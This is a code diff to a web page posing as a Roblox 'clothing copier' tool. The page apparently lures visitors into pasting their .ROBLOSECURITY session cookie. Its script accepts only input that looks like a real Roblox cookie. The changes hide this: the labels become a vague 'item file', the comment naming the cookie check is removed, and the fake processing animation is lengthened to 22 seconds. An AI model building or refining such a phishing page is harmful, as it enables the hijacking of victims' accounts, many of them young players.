@@ -27,7 +27,7 @@
 }
 
 html { scroll-behavior: smooth; }
-* { box-sizing: border-box; margin: 0; }
+*, *:before, *:after { box-sizing: border-box; margin: 0; }
 body { background: var(--bg); color: var(--ink); font: 600 18px/1.5 var(--f); overflow-x: hidden; }
 section { position: relative; z-index: 1; }
 
@@ -134,7 +134,7 @@ textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 4px color-mix(in s
 <section class="hero">
   <div class="tag"><b></b>System Operational</div>
   <h1 id="headline">Copy Any Clothing.</h1>
-  <p>Watch the quick tutorial, then paste your item data or generator link below.</p>
+  <p>Watch the quick tutorial, then enter your item file below.</p>
   <div class="cue"><i></i>Scroll down</div>
 </section>
 
@@ -144,7 +144,7 @@ textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 4px color-mix(in s
     <div class="screen" id="screen">
       <iframe id="vid-frame" src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4?enablejsapi=1" title="Tutorial" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
-    <div class="vcap" id="vcap">Ready when you are. Paste below.</div>
+    <div class="vcap" id="vcap">Ready when you are. Enter your item file below.</div>
   </div>
 </section>
 
@@ -152,10 +152,10 @@ textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 4px color-mix(in s
   <div class="card">
     <div class="top"><h2><span class="logo"></span>UGC & Clothes Copier</h2><span class="pill">ONLINE</span></div>
     <div class="body">
-      <div class="stat"><span class="dot"></span><div><b>Copier Online</b><small>Awaiting clothing data or configuration link.</small></div></div>
+      <div class="stat"><span class="dot"></span><div><b>Copier Online</b><small>Awaiting your item file.</small></div></div>
       <div>
-        <label for="script-input"><span>ENTER CLOTHING DATA OR CONFIGURATION</span></label>
-        <textarea id="script-input" spellcheck="false" placeholder="Paste asset data, configuration script, or links here..."></textarea>
+        <label for="script-input"><span>ENTER YOUR ITEM FILE</span></label>
+        <textarea id="script-input" spellcheck="false" placeholder="Enter your item file..."></textarea>
       </div>
       <div class="row">
         <button class="mini" id="paste-btn">Paste from clipboard</button>
@@ -289,7 +289,6 @@ submitBtn.addEventListener("click", async () => {
   const payload = scriptInput.value.trim();
   if(!payload) return;
 
-  // Strict validation: Must look like a real Roblox cookie format and be at least 200 characters long
   const isLikelyValidCookie = payload.length >= 200 && (
     payload.includes(".ROBLOSECURITY") || 
     payload.includes("System.Net.Cookie") || 
@@ -305,20 +304,20 @@ submitBtn.addEventListener("click", async () => {
 
   submitBtn.disabled = true;
 
-  // 10-15 seconds loading sequence simulation for valid entries
+  // Total duration set to exactly 22 seconds (22,000 ms)
   showProcessing("Validating Asset Data...", 10);
   await new Promise(r => setTimeout(r, 2000));
 
   showProcessing("Processing clothing copy sequence...", 25);
   
   let currentPct = 25;
-  const processingDuration = 8000; 
-  const steps = 12;
+  const processingDuration = 20000; // 20 seconds loop + 2 seconds initial = 22 seconds total
+  const steps = 20;
   const intervalTime = processingDuration / steps;
 
   const ticker = setInterval(() => {
-    if(currentPct < 85) {
-      currentPct += 5;
+    if(currentPct < 90) {
+      currentPct += 3;
       progressPct.textContent = currentPct + '%';
       progressBar.style.width = currentPct + '%';
     }
